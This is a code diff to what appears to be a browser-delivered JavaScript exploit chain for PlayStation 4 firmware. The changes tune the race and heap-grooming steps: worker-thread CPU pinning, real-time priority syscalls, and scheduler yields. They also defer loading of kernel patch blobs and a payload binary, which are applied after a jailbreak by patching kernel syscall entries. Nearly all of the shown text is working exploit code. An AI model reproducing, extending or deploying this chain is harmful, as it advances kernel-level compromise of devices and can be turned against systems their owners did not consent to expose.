@@ -9,6 +9,7 @@ import { offsetsFor } from "./ps4_offsets.js";
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
+const LOG_CAP = 96;
 let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
@@ -53,6 +54,8 @@ function mark(tag, detail) {
     const raw = detail;
     detail = terse(detail);
     lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+    if (lines.length > LOG_CAP)
+        lines.splice(0, lines.length - LOG_CAP);
     const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
     outEl.innerHTML = lines.map(function (l) {
         l = esc(l);
@@ -131,7 +134,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "chain_1352-2026-03-26f-step10";
+const CHAIN_BUILD = "chain_1352-2026-03-26g-oom-pin";
 
 (async function () {
     let p = null;
@@ -153,38 +156,47 @@ const CHAIN_BUILD = "chain_1352-2026-03-26f-step10";
             + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
 
         let kpatch = null, payload = null;
+        let kernelBlobsLoaded = false;
         // off.kpatch wins when a firmware shares another's kernel and therefore
         // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
         const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
             : key ? "patches/" + key.replace(".", "") + ".bin" : null;
         const KPATCH_JMP_SITES = [];
-        try {
-            if (kpatchName) {
-                const r = await fetch(kpatchName);
-                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
-            }
-        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
-        if (kpatch) {
+        mark("KPATCH-BLOB", "deferred name=" + (kpatchName || "none"));
+        mark("PAYLOAD-BLOB", "deferred");
 
-            for (let i = 0; i + 7 <= kpatch.length; ++i) {
-                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
-                if (kpatch[i + 6] !== 0xeb) continue;
-                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
-                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
+        async function ensureKernelBlobs() {
+            if (kernelBlobsLoaded) return;
+            kernelBlobsLoaded = true;
+            try {
+                if (kpatchName && !kpatch) {
+                    const r = await fetch(kpatchName);
+                    if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
+                }
+            } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
+            if (kpatch && KPATCH_JMP_SITES.length === 0) {
+                for (let i = 0; i + 7 <= kpatch.length; ++i) {
+                    if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
+                    if (kpatch[i + 6] !== 0xeb) continue;
+                    KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
+                        | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
+                }
             }
+            mark("KPATCH-BLOB", kpatch
+                ? "blob=" + kpatchName + " bytes=" + kpatch.length
+                  + " sites=" + KPATCH_JMP_SITES.length
+                : "blob=" + kpatchName + " MISSING");
+            try {
+                if (!payload) {
+                    const r = await fetch("payload.bin");
+                    if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
+                }
+            } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
+            mark("PAYLOAD-BLOB", payload
+                ? "bytes=" + payload.length + " entry="
+                  + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
+                : "MISSING");
         }
-        mark("KPATCH-BLOB", kpatch
-            ? "blob=" + kpatchName + " bytes=" + kpatch.length
-              + " sites=" + KPATCH_JMP_SITES.length
-            : "blob=" + kpatchName + " MISSING");
-        try {
-            const r = await fetch("payload.bin");
-            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
-        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
-        mark("PAYLOAD-BLOB", payload
-            ? "bytes=" + payload.length + " entry="
-              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
-            : "MISSING");
 
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
@@ -1476,13 +1488,15 @@ const CHAIN_BUILD = "chain_1352-2026-03-26f-step10";
             ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
         async function jscBreath(n, why) {
+            mark("JSC-BREATH", "start n=" + n + " at=" + why);
             for (let bi = 0; bi < n; ++bi) {
-                await new Promise(r => setTimeout(r, 16));
+                await new Promise(r => setTimeout(r, 0));
                 sc(SYS.sched_yield);
             }
-            mark("JSC-BREATH", "n=" + n + " at=" + why);
+            mark("JSC-BREATH", "done n=" + n + " at=" + why);
         }
-        await jscBreath(24, "pre-worker-pool");
+        dropGroomFootprint();
+        await jscBreath(6, "pre-worker-pool");
         state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
             const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
@@ -1630,18 +1644,17 @@ const CHAIN_BUILD = "chain_1352-2026-03-26f-step10";
             return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                 w.ctx.S.low, w.ctx.S.hi);
         }
-        await jscBreath(8, "pre-worker-pin");
         for (const w of workers) {
-            await new Promise(r => setTimeout(r, 0));
             sc(SYS.sched_yield);
             await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                 new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
-            await new Promise(r => setTimeout(r, 0));
             sc(SYS.sched_yield);
             await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
         }
         mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
             + " rtp=" + RTP);
+        dropGroomFootprint();
+        lines.splice(0, Math.max(0, lines.length - 48));
 
         function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
         function readTag() {
@@ -3135,6 +3148,7 @@ const CHAIN_BUILD = "chain_1352-2026-03-26f-step10";
 
 
                     let kpatched = false;
+                    await ensureKernelBlobs();
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
                         state("kernel patches...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
